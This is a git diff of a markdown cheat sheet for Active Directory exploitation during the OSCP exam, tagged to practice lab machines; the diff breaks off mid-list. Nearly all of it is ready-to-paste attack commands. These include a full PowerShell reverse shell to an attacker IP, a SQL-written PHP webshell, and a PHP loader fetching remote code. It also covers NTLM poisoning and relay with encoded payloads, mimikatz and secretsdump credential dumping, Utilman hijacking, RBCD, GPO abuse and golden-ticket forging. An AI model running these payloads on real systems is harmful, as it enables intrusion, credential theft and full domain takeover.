@@ -1,253 +1,291 @@
 # Active Directory Master Methodology (The Ultimate Playbook)
-Consolidated AD exploitation paths, pivoting techniques, and essential commands based on verified attack chains. Reference tags (e.g., [OSCPA]) link to specific machine notes.
+
+A chronological, phase-based tactical guide for Active Directory exploitation. Standardized for high-speed navigation (CTRL+F) during the OSCP exam.
+
+**Standard Environment Configuration:**
+- Domain: `corp.local`
+- DC IP: `192.168.100.10`
+- Target IP: `192.168.100.20`
+- Kali IP: `192.168.45.200`
+- User: `john.doe`
+- Pass: `P@ssw0rd123$`
+- Hash: `3dc553ce4b9fd20bd016e098d2d2fd2e` (Admin)
 
 ---
 
-## 🚀 FAST PWN 101 (Copy-Paste Cheat Sheet)
-*The "Tak Tak Tak" flow for initial compromise.*
+## ⚡ Quick Shell Cheat Sheet (One-Liners)
+*Rapid payload generation and trigger.*
 
-```bash
-# 1. User Enumeration (Kerbrute)
-kerbrute userenum -d domain.local --dc [DC_IP] /usr/share/wordlists/xato-net-10-million.txt
+### 1. Payload Generators (How to generate B64_PAYLOAD)
+- **Python (Kali) -> B64**: `echo -n '$c=New-Object Net.Sockets.TCPClient("192.168.45.200",4444);$s=$c.GetStream();$b=New-Object Byte[] 65536;while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String);$sb2=$sb+"PS "+(pwd).Path+"> ";$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$c.Close()' | iconv -t UTF-16LE | base64 -w 0`
+- **PowerShell (Windows) -> B64**: `$c = 'net user john.doe P@ssw0rd123$ /add'; [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($c))`
 
-# 2. AS-REP Roasting (No Pre-Auth)
-impacket-GetNPUsers domain.local/ -usersfile users.txt -format hashcat -dc-ip [DC_IP]
-
-# 3. SMB Share Enumeration (NetExec)
-nxc smb [DC_IP] -u 'user' -p 'pass' --shares
-# Note: Use --local-auth for local users, omit for domain users.
-# Note: Eric.Wallows case -> nxc smb 192.168.182.153 -u Eric.Wallows -p EricLikesRunning800 --shares
-
-# 4. Kerberoasting (User has valid creds)
-impacket-GetUserSPNs domain.local/user:password -dc-ip [DC_IP] -request
-
-# 5. Domain Dominance (Already have Admin/DCSync)
-impacket-secretsdump domain.local/admin:password@[DC_IP]
-```
+### 2. Ready-to-Use Payloads
+- **PowerShell Exec**: `powershell.exe -nop -w hidden -e JGM9TmV3LU9iamVjdCBOZXQuU29ja2V0cy5UQ1BDbGllbn...`
+- **MariaDB RCE (OUTFILE)**: `SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE 'C:/xampp/htdocs/shell.php';` `[OSCPA]`
+- **IIS 404/MIME Bypass**: `ren shell.exe shell.txt` (Access via `http://192.168.100.20/shell.txt` and rename back). `[Medtech]`
 
 ---
 
-## 🏗️ Method 1: Initial AD Enumeration & Discovery
-Focus on discovering users, groups, and entry points.
+## 🚀 Phase 0: Initial Enumeration & Assumed Breach Triage
+*Goal: Map the network, verify credentials, and identify quick wins.*
 
-### 1.1. LDAP Discovery `[OSCPB]` `[Forest]` `[Hutch]`
-```bash
-# Null Session Search
-ldapsearch -H ldap://[DC_IP] -x -b "dc=domain,dc=local"
+### 0.1. Credential Verification (Tak Tak Tak)
+- **Do this:** Verify credentials across the network range:
+  `nxc smb 192.168.100.0/24 -u 'john.doe' -p 'P@ssw0rd123$' -d corp.local`
+- **Do this:** Enumerate shares for the target:
+  `nxc smb 192.168.100.20 -u 'john.doe' -p 'P@ssw0rd123$' -d corp.local --shares`
+- **Alternative Method (Diğer Yöntem):** Use `smbclient` for manual browsing:
+  `smbclient -L //192.168.100.20 -U 'corp.local/john.doe%P@ssw0rd123$'`
 
-# Authenticated Search (Required for most AD environments)
-ldapsearch -H ldap://[DC_IP] -x -D "user@domain.local" -w "password" -b "dc=domain,dc=local"
+### 0.2. LDAP Object Enumeration
+- **LDAP Discovery (Null Session)** - **Do this:** Attempt to bind without credentials:
+  `ldapsearch -H ldap://192.168.100.10 -x -b "dc=corp,dc=local"`
+- **Authenticated LDAP Search** - **Do this:** Search LDAP with valid user:
+  `ldapsearch -H ldap://192.168.100.10 -x -D "john.doe@corp.local" -w 'P@ssw0rd123$' -b "dc=corp,dc=local"`
+- **Dump Users (NetExec Context)** - **Do this:** Dump users and their descriptions (Hunt for passwords):
+  `nxc ldap 192.168.100.10 -u 'john.doe' -p 'P@ssw0rd123$' -d corp.local --users`
+- **HUNT Descriptions (NetExec Module)** - **Do this:** Automatically scan descriptions for passwords:
+  `nxc ldap 192.168.100.10 -u john.doe -p 'P@ssw0rd123$' -M get-desc-users` `[Cicada] [Hutch] [Resourced]`
+- **Dump Groups** - **Do this:** Dump group memberships to identify high-privilege targets:
+  `nxc ldap 192.168.100.10 -u 'john.doe' -p 'P@ssw0rd123$' -d corp.local --group`
 
-# HUNT: Search for passwords in LDAP Descriptions [Cicada] [Hutch] [Resourced]
-# Pattern: cleartext passwords or default creds often left in 'description' field.
-netexec ldap [DC_IP] -u user -p password -M get-desc-users
-```
-
-### 1.2. Kerberos User Enumeration & Pre-Auth `[Blackfield]` `[Forest]` `[Sauna]`
-```bash
-# Kerbrute (User Enum via TGT requests) [Blackfield]
-kerbrute userenum -d domain.local --dc [DC_IP] users.txt
-
-# AS-REP Roasting (Find users with "Pre-auth Not Required") [Forest] [Blackfield] [Sauna]
-impacket-GetNPUsers domain.local/ -usersfile users.txt -format hashcat -outputfile asrep.txt
-```
-
-### 1.3. SMB Share Hunting `[Cicada]` `[Active]` `[Blackfield]` `[Resourced]`
-Look for shares like `HR`, `Forensic`, `Profiles$`, `Web`, `Dev`, `Password Audit`.
-```bash
-smbclient -L //[IP] -N
-nxc smb [IP] -u user -p password --shares
-# Advanced Fuzzing via Proxychains (Targeting isolated segments)
-proxychains nxc smb 10.10.142.154 -u users -p 'password' --local-auth
-
-# Check for sensitive files (e.g., Backup_script.ps1 [Cicada], ntds.dit backup [Resourced])
-# Pattern: Manual search for .xml, .ps1, or backup files in non-standard shares.
-```
-
-### 1.4. LAPS Password Exposure `[Hutch]`
-If a user has rights to read LAPS passwords (often IT support users).
-```bash
-# Read LAPS password using Netexec
-netexec smb [DC_IP] -u user -p password --laps
-# Read via pyLAPS (LDAP)
-python3 pyLAPS.py --action get -d "domain.local" -u "user" -p "password"
-```
-
-### 1.5. Automated Path Analysis (BloodHound) `[OSCPB]` `[Forest]` `[Administrator]`
-```bash
-# Remote Collection
-bloodhound-python -u 'user' -p 'password' -ns [DC_IP] -d domain.local -c All
-```
+### 0.3. Unauthenticated Entry (Fallback)
+- **User Enumeration (Kerberos)** - **Do this:** Enumerate valid usernames via Kerberos:
+  `kerbrute userenum -d corp.local --dc 192.168.100.10 /usr/share/wordlists/xato-net-10-million.txt`
+- **AS-REP Roasting** - **Do this:** Perform AS-REP Roasting for users with pre-auth disabled:
+  `impacket-GetNPUsers corp.local/ -usersfile users.txt -format hashcat -request`
+- **Anonymous SMB Enumeration** - **Do this:** Check for anonymous SMB access and list shares:
+  `nxc smb 192.168.100.10 -u '' -p '' --shares`
+- **Information Leakage Search** - **Do this:** Hunt for `.sql`, `.docx`, `.xml` files in shares:
+  - `smbclient //192.168.100.10/Shared -U ''`
+  - *HUNT*: `Onboarding.docx`, `Web.config`, `connection.sql` `[Zeus] [Flight] [Cicada]`.
+- **CloudSync / File Sync Abuse** - **Do this:** If a storage box (Linux/S3) syncs to a Windows Web Server:
+  1. **Two-Stage Script (download.php)**:
+     ```php
+     <?php $c=file_get_contents("http://192.168.45.200/rev.php"); file_put_contents("rev_local.php",$c); include("rev_local.php"); ?>
+     ```
+  2. **Upload (Kali)**: `curl -X PUT http://192.168.100.50/storage/download.php --data-binary @download.php`
+  3. **Trigger**: Visit `http://192.168.100.20/storage/download.php` `[Feast]`.
 
 ---
 
-## 🏹 Method 2: Movement & Lateral Escalation
-Techniques to pivot and gain higher-tier user access.
+## 🏗️ Phase 1: Member Server Triage & Local Privilege Escalation
+*Goal: Escalating from a domain user to local administrator on a member server.*
 
-### 2.1. NTLM Capture & Theft `[Flight]`
-Use when you have LFI or a writable SMB share.
-```bash
-# LFI to NTLM Capture [Flight]
-# Trigger: index.php?view=//[KALI_IP]/share
-sudo responder -I tun0 -v
+### 1.1. Local Credential Harvesting
+- **Do this:** Check PowerShell history for leaked credentials (e.g., admintool.exe [PASS]):
+  `type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt` `[OSCPC]`
+- **Do this:** Query the registry for Autologon credentials:
+  `reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"` `[Sauna] [OSCPA]`
+- **IIS AppPool Credentials** - **Do this:** Harvest credentials from Application Pools (If on IIS server):
+  `C:\Windows\system32\inetsrv\appcmd.exe list apppool /config` `[OSCPC]`
+- **LAPS Password** - **Do this:** Attempt to read LAPS passwords (If rights suspected):
+  `netexec smb 192.168.100.10 -u john.doe -p 'P@ssw0rd123$' --laps` `[Hutch]`
+- **Alternative Method (pyLAPS):** `pyLAPS --action get -d "corp.local" -u "john.doe" -p "P@ssw0rd123$"`
+- **LSA Secrets (SNMPTRAP)** - **Do this:** Harvest LSA secrets for plain-text service credentials:
+  `impacket-secretsdump -system SYSTEM -sam SAM LOCAL` or `-just-dc-user Administrator`
+  - *HUNT*: Look for `_SC_SNMPTRAP` or other service account keys `[Poseidon] [Feast]`.
+- **Alternative Method (Mimikatz):** `privilege::debug`, `token::elevate`, `lsadump::secrets`.
+- **Browser/Vault Secrets (Mimikatz)** - **Do this:** Extract Chrome/Browser secrets and MasterKeys:
+  `mimikatz # dpapi::masterkeys /in:"C:\Users\john.doe\AppData\Roaming\Microsoft\Protect\[SID]\[GUID]"`
+  `mimikatz # dpapi::chrome /in:"C:\Users\john.doe\AppData\Local\Google\Chrome\User Data\Default\Login Data"` `[OSCPA] [Heist]`
+- **Alternative Method (LAPS - Impacket):** If `nxc` fails, use Impacket's script:
+  `impacket-GetLAPSPassword corp.local/john.doe:'P@ssw0rd123$'@192.168.100.10`
 
-# NTLM Theft via desktop.ini (Triggering forced auth) [Flight]
-python3 ntlm_theft.py --generate all --server [KALI_IP] --filename htb
-```
-
-### 2.2. Password Abuse (ForceChangePassword / GenericAll) `[Blackfield]` `[Administrator]`
-If you have `GenericAll` or `ForceChangePassword` rights on a user:
-```bash
-# Reset password via rpcclient
-rpcclient -U 'user%password' [DC_IP]
-setuserinfo2 target_user 23 'NewPassword123!'
-```
-
-### 2.3. Targeted Kerberoasting `[Administrator]`
-If you have `GenericWrite` or `GenericAll` over a computer/user account, add a fake SPN to make it Kerberoastable.
-```powershell
-# Add SPN to target user account
-Set-ADUser target_user -ServicePrincipalNames @{Add='MSSQLSvc/fake.domain.local'}
-# Request TGS
-impacket-GetUserSPNs domain.local/user:password -request-user target_user
-```
-
-### 2.4. Service Account Harvesting (Kerberoasting) `[OSCPB]` `[Active]` `[Access]`
-```bash
-# Remote [Active] [Access]
-impacket-GetUserSPNs [DOMAIN]/[USER]:[PASS] -dc-ip [DC_IP] -request
-# Local (Rubeus) [OSCPB]
-.\rubeus.exe kerberoast /outfile:hashes.txt
-```
-
-### 2.5. Group Policy Preferences (GPP) `[Active]`
-If you find `Groups.xml` in `SYSVOL` or `NETLOGON`:
-```bash
-# Decrypt cpassword found in XML
-gpp-decrypt [ENCRYPTED_HASH]
-```
-
-### 2.6. MSSQL Pivoting `[OSCPB]` `[OSCPA]`
-If an MSSQL server is accessible via domain credentials:
-```sql
--- Connect and enable xp_cmdshell
-impacket-mssqlclient DOMAIN/user:'password'@10.10.x.x -windows-auth
-EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
-EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
-```
-
-### 2.7. Internal File Relay (IIS Web Root Trick) `[OSCPB]`
-Used when the target machine cannot reach Kali, but a compromised intermediate box has IIS:
-1. **Source**: `copy tool.exe C:\inetpub\wwwroot\t.exe`
-2. **Target**: `powershell -c "iwr http://[COMPROMISED_IP]:8000/t.exe -OutFile C:\Temp\t.exe"`
-
-### 2.8. DPAPI & Credential Vaults `[OSCPA]` `[Heist]`
-```powershell
-# Extract MasterKeys [OSCPA]
-mimikatz # dpapi::masterkeys /in:"C:\Users\[USER]\AppData\Roaming\Microsoft\Protect\[SID]\[GUID]"
-# Decrypt Chrome Passwords
-mimikatz # dpapi::chrome /in:"C:\Users\[USER]\AppData\Local\Google\Chrome\User Data\Default\Login Data"
-
-### 2.9. IIS AppPool Credential Harvesting `[OSCPC]` `[MS02]`
-If you have access to a machine running IIS, check for credentials in Application Pools.
-```powershell
-C:\Windows\system32\inetsrv\appcmd.exe list apppool /config
-# HUNT: Search for 'userName' and 'password' in the output.
-```
-
-### 2.10. Searching History for Binary Arguments `[OSCPC]` `[MS02]`
-High-value credentials often leak when administrators run tools (backup scripts, admin tools, net use) with credentials as arguments.
-```powershell
-# Check PowerShell History
-type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
-# Check for common patterns:
-# - admintool.exe [PASSWORD] [CMD]
-# - net use \\share /user:admin [PASSWORD]
-# - backup.ps1 -creds [PASSWORD]
-```
-```
+### 1.2. Local Privilege Escalation (System Shell)
+- **Do this:** Exploit SeImpersonatePrivilege with GodPotato:
+  `.\GodPotato-NET4.exe -cmd "powershell.exe -nop -w hidden -e JGM9TmV3LU9iamVjdC..."` `[Gust] [OSCPB] [Hutch]`
+- **Alternative Method (PrintSpoofer):** For older systems (Server 2016/2019):
+  `.\PrintSpoofer.exe -i -c "powershell.exe -nop -w hidden -e JGM9TmV3LU9iamVjdC..."` `[OSCPA] [OSCPB]`
+- **Do this:** Abuse SeRestorePrivilege by hijacking Utilman (RDP Logon screen):
+  `ren C:\Windows\System32\Utilman.exe Utilman.old && copy C:\Windows\System32\cmd.exe C:\Windows\System32\Utilman.exe` `[Heist]`
+- **Alternative Method (SeRestore + SAM):** Members can replace any file; replace a service binary or overwrite System32 files.
+- **Do this:** Abuse SeBackupPrivilege to dump registry hives or NTDS:
+  `reg save hklm\sam SAM && reg save hklm\system SYSTEM` `[Cicada] [Zeus]`
+- **Alternative Method (wbadmin):** `echo "Y" | wbadmin start backup -backuptarget:\\192.168.45.200\share -include:c:\windows\ntds` `[Blackfield]`
+- **HiveNightmare (SeriousSAM)** - **Do this:** If OS vulnerable (1809-19043):
+  `.\HiveNightmare.exe` then `impacket-secretsdump -sam SAM -system SYSTEM LOCAL` `[Cicada]`
+- **C:\windows.old Recovery** - **Do this:** If system upgraded, dump legacy SAM:
+  `impacket-secretsdump -sam C:\windows.old\Windows\System32\config\SAM -system C:\windows.old\Windows\System32\config\SYSTEM LOCAL` `[OSCPC]` `[OSCPA]`
+- **Unquoted Service Path Discovery**:
+  `wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """` `[Capstone]`
+- **SeManageVolume (DLL Hijack)** - **Do this:** Replace `tzres.dll` in `C:\Windows\System32\wbem\` after running exploit. `[Access]`
+- **Do this:** Abuse Server Operators group to modify service binPath:
+  `sc.exe config Spooler binPath= "net user john.doe P@ssw0rd123$ /add && net localgroup administrators john.doe /add"` `[Return]`
 
 ---
 
-## ⚡ Method 3: Windows Privilege Escalation
-Common escalation paths on member servers/workstations.
+## 🏹 Phase 2: Lateral Movement & Pivot Tactics
+*Goal: Moving between servers via captured credentials or relayed authentication.*
 
-### 3.1. SeImpersonatePrivilege (The Potato Path) `[OSCPB]` `[Gust]` `[Hutch]`
-```powershell
-# Modern Systems (GodPotato) [Gust] [OSCPB] [Hutch]
-.\GodPotato-NET4.exe -cmd "powershell -c [REVERSE_SHELL]"
-# Older Systems (PrintSpoofer) [OSCPA] [OSCPB]
-.\PrintSpoofer.exe -i -c cmd
-```
+### 2.1. Authentication Capture & Relay (The Poisoner Path)
+*Use when SMB signing is Disabled on a target and you have a trigger (LFI/DOCX).*
 
-### 3.2. SeManageVolumePrivilege (DLL Hijacking) `[Access]`
-Allows making System32 writable.
-1. Run `SeManageVolumeExploit.exe`.
-2. Replace `C:\Windows\System32\wbem\tzres.dll` with a malicious DLL.
-3. Trigger: `systeminfo`.
+- **Discovery (Find Relay Targets)** - **Do this:** Find machines where SMB Signing is NOT required:
+  `nxc smb 192.168.100.0/24 --gen-relay-list relay_targets.txt`
+- **Capture/Poison (Responder)** - **Do this:** Start Responder to poison LLMNR/NBT-NS (Disable SMB/HTTP in `Responder.conf` for relay):
+  `sudo responder -I tun0 -dwv`
+- **Relay (SMB Executive)** - **Do this:** Relay authentication to a signing-disabled target for shell/SAM dump:
+  `ntlmrelayx.py -tf relay_targets.txt -smb2support -l /tmp/hives -c "powershell -e JGM9TmV3LU9iamVjdC..."`
+- **Relay (LDAP/RBCD)** - **Do this:** Relay SMB to LDAP to set RBCD on a DC (If you have a relay target):
+  `ntlmrelayx.py -t ldap://192.168.100.10 --delegate-access --escalate-user john.doe --smb2support`
+- **LFI/SSRF Trigger** - **Do this:** Trigger connection via Web LFI:
+  `curl http://192.168.100.20/index.php?view=//192.168.45.200/share` `[Flight] [Heist]`
+- **IPv6 Poisoning (mitm6)** - **Do this:** Poison IPv6 for DNS queries (Relay to LDAPS for RBCD):
+  `sudo mitm6 -d corp.local` -> `ntlmrelayx.py -t ldaps://192.168.100.10 -wh 192.168.45.200 --delegate-access`
 
-### 3.3. HiveNightmare (SeriousSAM) `[Cicada]`
-If Windows Build 1809-19043 is present:
-```powershell
-.\HiveNightmare.exe
-# Dump locally on Kali:
-impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
+### 2.2. Pivoting (Internal Tool Staging)
+- **IIS Tool Staging** - **Do this:** Stage a tool on an internal IIS web root (If writable):
+  `copy tool.exe C:\inetpub\wwwroot\t.exe`
+- **Download (IWR)** - **Do this:** Download the tool from the target machine:
+  `iwr http://192.168.100.101/t.exe -OutFile C:\tmp\t.exe`
+- **Lateral Move (RunasCs)** - **Do this:** Execute a command as another user via RunasCs:
+  `.\RunasCs.exe john.doe 'P@ssw0rd123$' -r 192.168.45.200:4444 cmd.exe`
 
-### 3.4. C:\windows.old Recovery `[OSCPC]` `[MS02]`
-If the system was upgraded, old SAM/SYSTEM hashes exist in the backup directory.
-```powershell
-dir C:\windows.old\Windows\System32\config\
-# Exfiltrate and dump:
-impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
-```
-```
-
-### 3.4. SeBackupPrivilege Exploitation `[Cicada]` `[Blackfield]`
-```powershell
-# Method A: reg save [Cicada]
-reg save hklm\sam SAM
-reg save hklm\system SYSTEM
-# Method B: wbadmin (NTDS Backup) [Blackfield]
-echo "Y" | wbadmin start backup -backuptarget:\\[KALI_IP]\share -include:c:\windows\ntds
-```
-
-### 3.5. Web Shell Persistence & Session Poisoning `[Sniper]` `[Access]`
-- **.htaccess bypass**: `.htaccess` -> `AddType application/x-httpd-php .php16` [Access]
-- **Session Poisoning**: Injecting PHP into `\windows\temp\sess_[ID]` via malicious login [Sniper].
+### 2.3. Service Account Harvesting
+- **Kerberoasting** - **Do this:** Perform Kerberoasting to find crackable TGS tickets:
+  `impacket-GetUserSPNs corp.local/john.doe:'P@ssw0rd123$' -dc-ip 192.168.100.10 -request` `[Active] [Access] [OSCPA] [OSCPB]`
+- **Group Policy Preferences (GPP)** - **Do this:** If `Groups.xml` found in SYSVOL:
+  `gpp-decrypt az98aDSAsd987` `[Active]`
+- **MSSQL Pivoting** - **Do this:** Enable `xp_cmdshell` if connected via domain auth:
+  `EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;` `[OSCPA] [OSCPB]`
+- **SQLCmd Lateral (Data Extractor)**:
+  `EXEC xp_cmdshell 'sqlcmd -S localhost -E -Q "SELECT name FROM sys.databases" -o C:\tmp\db.txt';` `[Medtech]`
+- **Restricted Admin RDP (PtH)** - **Do this:** Login via RDP using a hash (No password):
+  `mstsc.exe /v:192.168.100.20 /restrictedadmin` (Ensure `DisableRestrictedAdmin` is 0 in Registry). `[Capstone]`
+- **Printer Bug (SpoolSample)** - **Do this:** Force auth from DC to Kali (for capture) or compromised server:
+  `.\SpoolSample.exe DC01.corp.local COMPSERV.corp.local` `[Capstone]`
 
 ---
 
-## 👑 Method 4: Domain Dominance & Advanced Delegation
-Steps to achieve complete control over the entire domain.
+## 👑 Phase 3: Domain Escalation (Path to Domain Admin)
+*Goal: Abuse AD object permissions to gain DCSync or DA rights.*
 
-### 4.1. RBCD (Resource-Based Constrained Delegation) `[Resourced]`
-Step 1: Compromise a user with `GenericAll` over a Computer object.
-Step 2: Add a machine account: `impacket-addcomputer`.
-Step 3: Set delegation: `impacket-rbcd -delegate-from 'ATTACK$' -delegate-to 'RESOURCEDC$'`.
-Step 4: Get ST: `impacket-getST -spn 'cifs/dc.domain.local' -impersonate Administrator`.
+### 3.1. Advanced Object Abuse (Generic PATH)
+- **RBCD (Resource-Based Constrained Delegation)**:
+  - *Indicator*: `GenericAll/Write` on **Computer** object `[Poseidon] [Resourced]`.
+  - **Attack Discovery (How to find targets)** - **Do this:** Search LDAP for computer objects that a user has `GenericWrite` or `WriteDacl` over:
+    `nxc ldap 192.168.100.10 -u 'john.doe' -p 'P@ssw0rd123$' -M bloodhound -o COLLECTION=Default` (Then check BloodHound for RBCD paths).
+  - **Discovery (Find SIDs)** - **Do this:** Get the SID of the DC or Target Computer:
+    `impacket-lookupsid corp.local/john.doe:'P@ssw0rd123$'@192.168.100.10`
+  - **Phase 1 (Computer Creation)** - **Do this:** Create a new attack computer object:
+    `impacket-addcomputer corp.local/john.doe:'P@ssw0rd123$' -computer-name 'ATTACK$' -computer-pass 'Pass123$'`
+  - **Phase 2 (Set RBCD)** - **Do this:** Configure Resource-Based Constrained Delegation:
+    `impacket-rbcd -delegate-from 'ATTACK$' -delegate-to 'DC01$' corp.local/john.doe:'P@ssw0rd123$'`
+  - **Phase 3 (S4U2Proxy)** - **Do this:** Request a Service Ticket (ST) for impersonation:
+    `impacket-getST -spn 'cifs/DC01.corp.local' -impersonate Administrator corp.local/ATTACK$:'Pass123$'`
+  - **Final Access (Secretsdump)** - **Do this:** Use the forged ticket to dump domain secrets:
+    `export KRB5CCNAME=Administrator.ccache && impacket-secretsdump -k -no-pass DC01.corp.local`
 
-### 4.2. DCSync (Secretsdump) `[OSCPB]` `[Forest]` `[Flight]` `[Sauna]` `[Administrator]`
-Requires `DCSync` rights or Domain Admin.
-```bash
-# Remote DCSync [OSCPB] [Sauna] [Administrator]
-impacket-secretsdump domain.local/[ADMIN]:[PASS]@[DC_IP]
-# Remote DCSync (Kerberos Ticket) [Flight]
-impacket-getST -spn 'cifs/dc.domain.local' -impersonate Administrator
-impacket-secretsdump -k -no-pass [DC_HOSTNAME]
-```
+- **GPO Abuse (GenericWrite/WriteOwner)**:
+  - *Indicator*: Permission over a **GPO** `[Secura] [Vault] [TheFrizz]`.
+  - **How to find GPO GUIDs** - **Do this:** Search LDAP for the GPO name and its GUID:
+    `ldapsearch -H ldap://192.168.100.10 -x -D "john.doe@corp.local" -w 'P@ssw0rd123$' -b "CN=Policies,CN=System,DC=corp,DC=local" "(displayName=Default Domain Policy)" cn` -> `{GUID}`
+  - **Attack (Automated - SharpGPOAbuse)** - **Do this:** Add a user to local Administrators group:
+    `.\SharpGPOAbuse.exe --AddLocalAdmin --GPOName "Default Domain Policy" --UserAccount john.doe`
+  - **Attack (Manual - bloodyAD)** - **Do this:** Grant GenericAll to the GPO via bloodyAD for manual file edits:
+    `bloodyAD -u john.doe -p 'P@ssw0rd123$' -d corp.local --host 192.168.100.10 add genericAll "CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=corp,DC=local" john.doe`
+  - **Manual GPO Injection (GptTmpl.inf)** - **Do this:** Edit `\\corp.local\SYSVOL\...\Machine\...\GptTmpl.inf`:
+    ```ini
+    [Unicode]
+    Unicode=yes
+    [Group Membership]
+    *S-1-5-32-544__Members = john.doe
+    [Version]
+    signature="$CHICAGO$"
+    Revision=1
+    ```
+    *Note*: Must increment `Version` in `GPT.INI` (e.g., set to 99999) to trigger update. `[Secura]`
+  - **Attack (Exchange Registry Abuse):** `Add-ObjectAcl -PrincipalIdentity "john.doe" -Rights DCSync` `[Forest]`
 
-### 4.3. Exchange Registry Abuse `[Forest]`
-Grant yourself DCSync: `Add-ObjectAcl -PrincipalIdentity "YourUser" -Rights DCSync`.
+- **Account Takeover (GenericAll / GenericWrite on USER)**:
+  - **Do this:** Reset password via rpcclient (Traditional fallback):
+    `rpcclient -U 'john.doe%P@ssw0rd123$' 192.168.100.10` -> `setuserinfo2 john.doe 23 'P@ssw0rd123$'` `[Blackfield] [Administrator]`
+  - **Do this:** Set a fake SPN on the target user for Kerberoasting (User Takeover):
+    `bloodyAD -u john.doe -p 'P@ssw0rd123$' -d corp.local --host 192.168.100.10 set object john.doe servicePrincipalName -v 'http/fake.corp.local'` `[Laser] [Administrator]`
+  - **Alternative Method (PowerView):** `Set-ADUser john.doe -ServicePrincipalNames @{Add='http/fake.corp.local'}`
+
+- **Web Persistence & Lateral Exposure**:
+  - **.htaccess Bypass** - **Do this:** If PHP upload is restricted, try:
+    `AddType application/x-httpd-php .php16` in a custom `.htaccess` file. `[Access]`
+  - **Session Poisoning (Sniper)** - **Do this:** Inject PHP into `\windows\temp\sess_12345` via login fields. `[Sniper]`
+
+### 3.2. Exchange & Shadow Creds
+- **Exchange Win Privs**: `Add-ObjectAcl -PrincipalIdentity "john.doe" -Rights DCSync` `[Forest]`
+- **Shadow Credentials**: `pywhisker -d corp.local -u john.doe -p 'P@ssw0rd123$' --target victim.user --action "add"`
+
+### 3.3. Kerberos Delegation Abuse
+- **TGT Delegation (Unconstrained)** - **Do this:** If you have a shell on a machine where a DA has a session:
+  `.\Rubeus.exe tgtdeleg /nowrap`
+- **S4U2Self / S4U2Proxy** - **Do this:** If you have GenericAll on a computer object (See RBCD section).
 
 ---
 
-## 🧪 Quick Win Matrix
-| Pattern | Machine | Technique |
+## ⚡ Phase 4: Domain Dominance & Trust Abuse
+*Goal: Maintaining control and moving across forests.*
+
+### 4.1. Domain Trust Abuse (Extra SIDs / Golden Ticket)
+- **Indicator**: Child Domain Admin -> Parent Domain Admin `[Poseidon]`.
+- **Discovery (Find Forest SIDs)** - **Do this:** Capture both Child and Parent SIDs for ticket forging:
+  1. **Get Child SID**: `impacket-lookupsid corp.local/john.doe:'P@ssw0rd123$'@192.168.100.10`
+  2. **Get Parent SID (Guest Method)**: `impacket-lookupsid parent.local/guest@192.168.100.1` (Or use any captured parent user).
+  3. **Capture KRBTGT Hash (DCSync)**: `impacket-secretsdump corp.local/admin:'Pass123$'@192.168.100.10 -just-dc-user krbtgt`
+- **Exploitation (Ticket Forgery)** - **Do this:** Forge a cross-domain Golden Ticket with Domain Admin rights (519) in the parent:
+  1. `impacket-ticketer -nthash 31d6cfe0d16ae931b73c59d7e0c089c0 -domain-sid S-1-5-21-1234-5678-9012 -extra-sid S-1-5-21-9876-5432-1098-519 Administrator`
+  2. `export KRB5CCNAME=Administrator.ccache && impacket-secretsdump -k -no-pass dc01.parent.local`
+
+### 4.2. Domain Dominance (DCSync)
+- **DCSync Attack** - **Do this:** Dump all domain hashes via DCSync permissions:
+  `impacket-secretsdump corp.local/Administrator:'P@ssw0rd123$'@192.168.100.10`
+- **Alternative Method (Mimikatz):** Extract from a DC foothold:
+  `lsadump::dcsync /domain:corp.local /all /csv`
+- **NTDS.dit Extraction (Shadow Copy)** - **Do this:** Use `vssadmin` or `ntdsutil` to capture the database:
+  `vssadmin create shadow /for=C:` -> `copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\tmp` `[Resourced]`
+
+---
+
+## 🧪 Tactical Decision Matrix (Summary)
+| Finding | Machine | Technique |
 | :--- | :--- | :--- |
-| **LAPS Password** | `Hutch` | `netexec --laps` |
-| **Targeted Kerberoast**| `Administrator` | `Set-ADUser` fake SPN |
-| **DLL Hijack (Volume)** | `Access` | `tzres.dll` in `System32\wbem` |
-| **Autologon Creds** | `Sauna`, `OSCPA` | Registry: `DefaultPassword` |
-| **RBCD Pwn** | `Resourced` | Delegation to DC Computer Object |
-| **Session Poisoning** | `Sniper` | RCE via PHP Session file |
-| **wbadmin NTDS** | `Blackfield` | `wbadmin start backup` to SMB |
+| **Anonymous SMB** | `Active` | GPP Hashes / Shares / Groups.xml |
+| **GenericAll (Computer)** | `Poseidon` | RBCD Attack |
+| **GenericWrite (User)** | `Laser` | SPN Hijack + Kerberoast |
+| **GenericWrite (GPO)** | `Secura` | SYSVOL Version Bump / SharpGPOAbuse |
+| **Server Operators** | `Return` | BinPath Service Mod |
+| **LAPS Reading Rights** | `Hutch` | `netexec --laps` / pyLAPS |
+| **AutoLogon (Registry)** | `Sauna` | DefaultPassword harvesting |
+| **SeBackupPrivilege** | `Cicada` | Reg Save (SAM/SYS) / wbadmin |
+| **gMSA Account** | `Heist` | GMSAPasswordReader |
+| **SeManageVolume** | `Access` | tzres.dll Hijack |
+| **Exchange Permissions**| `Forest` | Granting DCSync |
+| **Shadow Credentials** | `Universal` | pywhisker PFX exploit |
+| **Session Poisoning** | `Sniper` | \windows\temp\sess_12345 Inject |
+| **.htaccess Bypass** | `Access` | AddType x-httpd-php .php16 |
+
+---
+
+## ⚡ Command Shortcuts (90% Use Case)
+- **Credential Spray** - **Do this:** Spray passwords against the network:
